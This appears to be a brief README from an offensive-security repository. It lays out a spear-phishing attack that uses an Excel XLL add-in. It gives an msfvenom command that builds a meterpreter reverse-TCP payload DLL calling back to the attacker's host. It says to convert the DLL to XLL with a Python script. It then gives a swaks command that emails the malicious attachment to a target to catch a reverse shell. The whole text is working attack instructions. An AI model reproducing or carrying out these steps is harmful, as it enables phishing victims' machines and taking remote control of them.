# Spear Phish with XLL file

## STEPS:

 - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=MY_PORT -f dll > pwn.dll (Create a .dll file)

## Then convert that .dll file to .xll with a python script (Will provide the script in this folder)

 - swaks --to TARGET@DOMAIN.LOCAL --from MYSELF@TESTMAIL.COM --header "Subject: WHATEVER" --body "WHATEVER" --attach @pwn.xll --server TARGET_IP --port 25 (Send the malicious file to our target to catch the reverse shell)

 
